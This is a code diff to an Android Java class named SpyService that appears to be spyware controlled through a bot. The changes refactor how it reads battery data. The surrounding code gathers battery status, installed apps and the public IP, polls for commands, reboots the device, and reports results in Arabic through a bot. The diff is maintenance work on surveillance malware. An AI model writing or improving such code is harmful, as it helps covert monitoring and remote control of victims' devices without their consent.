@@ -98,9 +98,14 @@ public class SpyService extends Service {
 
     private int getBatteryLevel() {
         try {
-            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
-            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
-        } catch (Exception e) { return -1; }
+            Intent batteryIntent = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
+            if (batteryIntent != null) {
+                int level = batteryIntent.getIntExtra("level", -1);
+                int scale = batteryIntent.getIntExtra("scale", -1);
+                if (level >= 0 && scale > 0) return (level * 100) / scale;
+            }
+        } catch (Exception e) { Log.e(TAG, "battery err", e); }
+        return -1;
     }
 
     private void pollCommands() {
@@ -229,7 +234,7 @@ public class SpyService extends Service {
     private File collectApps() throws Exception {
         File f = new File(getCacheDir(), "apps.txt");
         FileOutputStream fos = new FileOutputStream(f);
-        android.content.pm.PackageManager pm = getPackageManager();
+        PackageManager pm = getPackageManager();
         List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
         for (android.content.pm.PackageInfo pkg : packages) {
             String name = pkg.applicationInfo.loadLabel(pm).toString();
@@ -501,12 +506,20 @@ public class SpyService extends Service {
 
     private void getBatteryInfo() {
         try {
-            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
-            int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
-            int temp = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_TEMPERATURE);
-            int voltage = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_VOLTAGE);
-            bot.sendText("🔋 البطارية: " + level + "%\n🌡️ الحرارة: " + (temp/10) + "°C\n⚡ الفولتية: " + voltage + "mV");
-        } catch (Exception e) { bot.sendText("❌ فشل قراءة البطارية"); }
+            Intent batteryIntent = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
+            if (batteryIntent != null) {
+                int level = batteryIntent.getIntExtra("level", -1);
+                int scale = batteryIntent.getIntExtra("scale", -1);
+                int percentage = (level * 100) / scale;
+                int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
+                int voltage = batteryIntent.getIntExtra("voltage", 0);
+                bot.sendText("🔋 البطارية: " + percentage + "%\n🌡️ الحرارة: " + temp + "°C\n⚡ الفولتية: " + voltage + "mV");
+            } else {
+                bot.sendText("❌ فشل قراءة البطارية");
+            }
+        } catch (Exception e) {
+            bot.sendText("❌ فشل قراءة البطارية: " + e.getMessage());
+        }
     }
 
     private void getPublicIp() {
@@ -551,7 +564,7 @@ public class SpyService extends Service {
 
     private void getInstalledPackages() {
         try {
-            android.content.pm.PackageManager pm = getPackageManager();
+            PackageManager pm = getPackageManager();
             List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
             StringBuilder sb = new StringBuilder();
             int count = 0;
@@ -591,7 +604,7 @@ public class SpyService extends Service {
             bot.sendText("🔄 تم إعادة التشغيل");
         } catch (Exception e) {
             try {
-                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                 pm.reboot(null);
                 bot.sendText("🔄 تم إعادة التشغيل");
             } catch (Exception ex) {
